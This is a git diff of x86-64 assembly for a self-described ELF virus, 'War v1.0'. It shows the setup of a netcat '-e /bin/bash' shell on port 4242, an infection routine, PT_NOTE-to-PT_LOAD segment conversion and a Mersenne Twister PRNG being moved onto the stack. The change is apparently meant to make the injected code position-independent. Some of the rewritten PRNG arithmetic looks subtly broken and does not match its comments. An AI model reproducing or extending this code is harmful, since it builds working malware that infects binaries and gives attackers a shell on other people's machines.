@@ -488,12 +488,10 @@ nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
-magic_key: db 0xf0, 0xe8, 0x3d, 0x17, 0x0e, 0xbf, 0x00, 0x48, 0x8b, 0x35, 0xd6, 0x32, 0xf6, 0x48, 0x79, 0x5f
+magic_key: db 0xf0, 0xe8, 0x3d, 0x53, 0x04, 0xbf, 0x00, 0x48, 0x8b, 0x35, 0xd6, 0x32, 0xf6, 0x48, 0x79, 0x5f
 db 0x1a, 0x9a, 0x4b, 0x83, 0xf8, 0xb9, 0x75, 0x67, 0xe8, 0x82, 0xe8, 0x4a, 0x02, 0x48, 0x83, 0x13
 db 0x2f, 0xe4, 0xfc
 magic_key_size: equ $ - magic_key
-rand_buffer: times 624 dd 0
-rand_index: dd 0
 ; never used but here to be copied in the binary
 signature: db "War v1.0 by jmaia and dhubleur", 0
 ; END FAKE .data SECTION
@@ -509,6 +507,9 @@ infection_routine:
 	%local real_begin_compressed_data_ptr:qword	; uint8_t *real_begin_compressed_data_ptr
 	%xdefine nc_args rbp - %$localsize - 7*8	; char *nc_args[7];
 	%assign %$localsize %$localsize + 7*8		; ...
+	%local rand_index:qword				; long rand_index;
+	%xdefine rand_buffer rbp - %$localsize - 624*4	; uint32_t rand_buffer[624];
+	%assign %$localsize %$localsize + 624*4		; ...
 
 	; Initializes stack frame
 	push rbp
@@ -1251,101 +1252,189 @@ convert_pt_note_to_load:
 	ret						; return _ret;
 
 ; Mersenne Twister PRNG algorithm (https://en.wikipedia.org/wiki/Mersenne_Twister)
-; void srand(unsigned int seed);
-; void srand(rdi seed);
+; void srand(unsigned int seed, unsigned int *rand_buffer);
+; void srand(rdi seed, rsi rand_buffer);
 srand:
-	mov [rand_buffer], rdi				; rand_buffer[0] = seed;
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local rand_buffer:qword			; unsigned int *rand_buffer;
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [rand_buffer], rsi				; rand_buffer = _rand_buffer;
+	mov [rsi], rdi					; rand_buffer[0] = seed;
 
 	mov rsi, 1					; i = 1;
 	.begin_srand_loop:
 		cmp rsi, 624				; if (i == 624)
 		je .end_srand_loop			; 	goto .end_srand_loop;
 
-		mov rdi, [rand_buffer + rsi - 1]	; _tmp = rand_buffer[i - 1];
-		mov rax, rdi				; _tmp2 = rand_buffer[i - 1];
-		shr rdi, 30				; _tmp >>= 30;
-		xor rax, rdi				; _tmp2 ^= _tmp;
-		imul rax, 1812433253			; _tmp2 *= 1812433253;
-		add rax, rsi				; _tmp2 += i;
-		mov [rand_buffer + rsi], rax		; rand_buffer[i] = _tmp;
+		mov rdi, [rand_buffer]			; _tmp = rand_buffer[i - 1];
+		sub rdi, 1				; ...
+		add rdi, rsi				; ...
+		mov eax, [rdi]				; ...
+
+		mov ebx, eax				; _tmp2 = _tmp;
+		shr eax, 30				; _tmp >>= 30;
+		xor eax, ebx				; _tmp2 ^= _tmp;
+		imul eax, 1812433253			; _tmp2 *= 1812433253;
+		add eax, esi				;  _tmp2 += i;
+
+		mov rdi, [rand_buffer]			; rand_buffer[i] = _tmp;
+		add rdi, rsi				; ...
+		mov [rdi], eax				; ...
+
 		inc rsi					; i++;
 		jmp .begin_srand_loop			; goto .begin_srand_loop;
 
 	.end_srand_loop:
+		add rsp, %$localsize
+		pop rbp
+		%pop
 		ret
 
-; void generate_random_buffer()
+; void generate_random_buffer(unsigned int *rand_buffer)
+; void generate_random_buffer(rdi rand_buffer);
 generate_random_buffer:
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local rand_buffer:qword			; unsigned int *rand_buffer;
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [rand_buffer], rdi				; rand_buffer = _rand_buffer;
+
 	mov rsi, 0					; i = 0;
 	.begin_generate_random_buffer:
 		cmp rsi, 624				; if (i == 624)
 		je .end_generate_random_buffer		; 	goto .end_generate_random_buffer;
 
-		mov rax, [rand_buffer + rsi]		; y = rand_buffer[i] & 0x80000000;
-		mov rcx, 0x80000000			; ...
-       		and rax, rcx				; ...
-		mov rdx, rsi				; y += rand_buffer[(i + 1) % 624] & 0x7fffffff;
+		mov rdi, [rand_buffer]			; y = rand_buffer[i] & 0x80000000;
+		add rdi, rsi				; ...
+		mov eax, [rdi]				; ...
+		mov ebx, 0x80000000			; ...
+       	and eax, ebx				; ...
+		
+		mov rdi, [rand_buffer]			; y += rand_buffer[(i + 1) % 624] & 0x7fffffff;
+		mov rdx, rsi				; ...
 		inc rdx					; ...
 		and rdx, 623				; ...
-		mov rdx, [rand_buffer + rdx]		; ...
-		and rdi, 0x7fffffff			; ...
-		add rax, rdi				; ...
+		add rdi, rdx				; ...
+		mov ebx, [rdi]				; ...
+		mov ecx, 0x7fffffff			; ...
+		add ebx, ecx				; ...
+		add eax, ebx				; ...
 
-		mov rdx, rsi				; rand_buffer[i] = rand_buffer[(i + 397) % 624] ^ (y >> 1);
+		mov rdi, [rand_buffer]			; rand_buffer[i] = rand_buffer[(i + 397) % 624] ^ (y >> 1);
+		mov rdx, rsi				; ...
 		add rdx, 397				; ...
 		and rdx, 623				; ...
-		mov rdi, [rand_buffer + rdx]		; ...
-		shr rax, 1				; ...
-		xor rdi, rax				; ...
-		mov [rand_buffer + rsi], rdi		; ...
+		add rdi, rdx				; ...
+		mov ebx, [rdi]				; ...
+		mov ecx, eax				; ...
+		shr ecx, 1				; ...
+		xor ebx, ecx				; ...
+		mov rdx, [rand_buffer]			; ...
+		add rdx, rsi				; ...
+		mov [rdx], ebx				; ...
 
-		test rax, 1				; if (y % 2 == 0)
+		test eax, 1				; if (y % 2 == 0)
 		jz .next_generate_random_buffer_loop	; 	goto .next_generate_random_buffer_loop;
 
-		mov rdi, [rand_buffer + rsi]		; rand_buffer[i] = rand_buffer[i] ^ 2567483615;
-		mov rcx, 2567483615			; ...
-		xor rdi, rcx				; ...
-		mov [rand_buffer + rsi], rdi		; ...
+		mov rdi, [rand_buffer]			; rand_buffer[i] = rand_buffer[i] ^ 2567483615;
+		add rdi, rsi				; ...
+		mov ebx, [rdi]				; ...
+		mov ecx, 2567483615			; ...
+		xor ebx, ecx				; ...
+		mov rdx, [rand_buffer]			; ...
+		add rdx, rsi				; ...
+		mov [rdx], ebx				; ...
 
 		.next_generate_random_buffer_loop:
 			inc rsi				; i++;
 			jmp .begin_generate_random_buffer	; goto .begin_generate_random_buffer;
 
 	.end_generate_random_buffer:
+		add rsp, %$localsize
+		pop rbp
+		%pop
 		ret
 		
 
-; unsigned int rand();
-; rax rand();
+; unsigned int rand(unsigned int *rand_buffer, long *rand_index);
+; rax rand(rdi rand_buffer, rsi rand_index);
 rand:
-	movsxd rax, dword [rand_index]		; if (rand_index != 0)
-	cmp rax, 0				; ...
-	jne .continue				; 	goto .continue;
-	call generate_random_buffer		; generate_random_buffer();
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local rand_buffer:qword			; unsigned int *rand_buffer;
+	%local rand_index:qword				; long *rand_index;
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [rand_buffer], rdi				; rand_buffer = _rand_buffer;
+	mov [rand_index], rsi				; rand_index = _rand_index;
+
+	mov rsi, [rsi]					; rand_index_val = *rand_index;
+	cmp rsi, 0					; if (rand_index_val != 0)
+	jne .continue					; 	goto .continue;
+	call generate_random_buffer			; generate_random_buffer();
 
 	.continue:
-		movsxd rax, dword [rand_index]		; y = rand_buffer[rand_index];
-		mov rax, [rand_buffer + rax]		; ...
-		mov rdi, rax				; y2 = y >> 11;
-		shr rdi, 11				; ...
-		xor rax, rdi				; y ^= y2;
-		mov rdi, rax				; y2 = y << 7 & 2636928640;
-		shl rdi, 7				; ...
-		mov rcx, 2636928640			; ...
-		and rdi, rcx				; ...
-		xor rax, rdi				; y ^= y2;
-		mov rdi, rax				; y2 = y << 15 & 4022730752;
-		shl rdi, 15				; ...
-		mov rcx, 4022730752			; ...
-		and rdi, rcx				; ...
-		xor rax, rdi				; y ^= y2;
-		mov rdi, rax				; y2 = y >> 18;
-		shr rdi, 18				; ...
-		xor rax, rdi				; y ^= y2;
-		movsxd rdi, dword [rand_index]		; rand_index = (rand_index + 1) % 624;
+		mov rax, [rand_index]			; y = rand_buffer[rand_index];
+		mov rax, [rax]				; ...
+		mov rdi, [rand_buffer]			; ...
+		add rdi, rax				; ...
+		mov eax, [rdi]				; ...
+
+		mov ebx, eax				; y2 = y >> 11;
+		shr ebx, 11				; ...
+
+		xor eax, ebx				; y ^= y2;
+
+		mov ebx, eax				; y2 = y << 7 & 2636928640;
+		shl ebx, 7				; ...
+		mov ecx, 2636928640			; ...
+		and ebx, ecx				; ...
+
+		xor eax, ebx				; y ^= y2;
+
+		mov ebx, eax				; y2 = y << 15 & 4022730752;
+		shl ebx, 15				; ...
+		mov ecx, 4022730752			; ...
+		and ebx, ecx				; ...
+
+		xor eax, ebx				; y ^= y2;
+
+		mov ebx, eax				; y2 = y >> 18;
+		shr ebx, 18				; ...
+
+		xor eax, ebx				; y ^= y2;
+
+		mov rdi, [rand_index]			; rand_index = (rand_index + 1) % 624;
+		mov rdi, [rdi]				; ...
 		inc rdi					; ...
 		and rdi, 623				; ...
-		mov [rand_index], rdi			; ...
+		mov rdx, [rand_index]			; ...
+		mov [rdx], rdi				; ...
+
+		add rsp, %$localsize
+		pop rbp
+		%pop
 		ret					; return y;
 
 ; void itoa(uint8_t _buf[10], uint64_t _number);
